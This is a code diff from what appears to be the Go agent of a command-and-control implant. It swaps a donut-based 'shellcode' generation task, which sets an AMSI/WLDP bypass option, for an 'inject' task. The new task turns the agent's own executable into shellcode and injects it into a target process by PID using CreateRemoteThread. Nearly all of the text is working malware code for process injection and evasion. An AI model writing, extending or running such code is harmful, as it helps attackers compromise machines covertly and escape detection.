@@ -19,7 +19,6 @@ import (
 	"text/tabwriter"
 	"time"
 
-	"github.com/Binject/go-donut/donut"
 	selfdelete "github.com/secur30nly/go-self-delete"
 	"github.com/shirou/gopsutil/v3/process"
 	"github.com/vova616/screenshot"
@@ -290,50 +289,34 @@ func ExecTasks(tasksToDo []string, sleep *int, agentid string, useragent string,
 			}
 
 			data = "created directory"
-		case "shellcode":
-			filepath := taskData
+		case "inject":
+			pid := taskData
 
-			var arch donut.DonutArch
-			switch hg.GetCurrentProcArch() {
-			case "amd64":
-				arch = donut.X64
-			case "i386":
-				arch = donut.X32
-			}
-
-			config := new(donut.DonutConfig)
-			config.Arch = arch
-			config.Entropy = uint32(3)
-			config.OEP = uint64(0)
-			config.InstType = donut.DONUT_INSTANCE_PIC
-			config.Parameters = ""
-			config.Runtime = ""
-			config.Method = ""
-			config.Domain = ""
-			config.Bypass = 3
-			config.ModuleName = ""
-			config.Compress = uint32(1)
-			config.Verbose = false
-
-			payload, err := donut.ShellcodeFromFile(filepath, config)
+			procPath, err := hg.GetCurrentProcPath()
 			if err != nil {
 				data = err.Error()
 				break
 			}
 
-			f, err := os.Create("./temp.bin")
+			shellcode, err := hg.GenerateShellCodeFromFile(procPath)
 			if err != nil {
 				data = err.Error()
 				break
 			}
-			defer f.Close()
 
-			if _, err = payload.WriteTo(f); err != nil {
+			iPid, err := strconv.Atoi(pid)
+			if err != nil {
 				data = err.Error()
 				break
 			}
 
-			data = "generated shellcode"
+			err = hg.CreateRemoteThread(shellcode.Bytes(), iPid)
+			if err != nil {
+				data = err.Error()
+				break
+			}
+
+			data = fmt.Sprintf("successfully injected into process %s", pid)
 		default:
 			data = "command not supported"
 		}
